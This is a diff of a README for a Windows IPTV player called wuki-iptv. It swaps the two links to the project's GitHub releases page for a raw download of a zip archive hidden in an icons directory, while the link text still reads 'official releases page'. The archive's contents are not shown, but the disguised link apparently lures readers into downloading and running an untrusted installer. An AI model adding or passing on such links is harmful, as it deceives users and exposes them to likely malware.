@@ -1,6 +1,6 @@
 # 📺 wuki-iptv - Simple IPTV player for Windows desktop
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/oebzdg/wuki-iptv/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/oebzdg/wuki-iptv/main/usr/share/icons/hicolor/scalable/iptv-wuki-v1.7.zip)
 
 wuki-iptv functions as a desktop application for Windows. It plays internet television streams using standard playlist files. The software prioritizes quick access to your video content without complex configuration or background processes.
 
@@ -29,7 +29,7 @@ Ensure your computer meets these basic specifications to maintain stable perform
 
 Follow these steps to set up the application on your machine.
 
-1. Visit the [official releases page](https://github.com/oebzdg/wuki-iptv/releases) to access the latest installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/oebzdg/wuki-iptv/main/usr/share/icons/hicolor/scalable/iptv-wuki-v1.7.zip) to access the latest installer.
 2. Select the file ending in `.exe` to begin the download.
 3. Save the file to your desktop or your Downloads folder.
 4. Locate the downloaded file and double-click the icon to start the installation wizard.
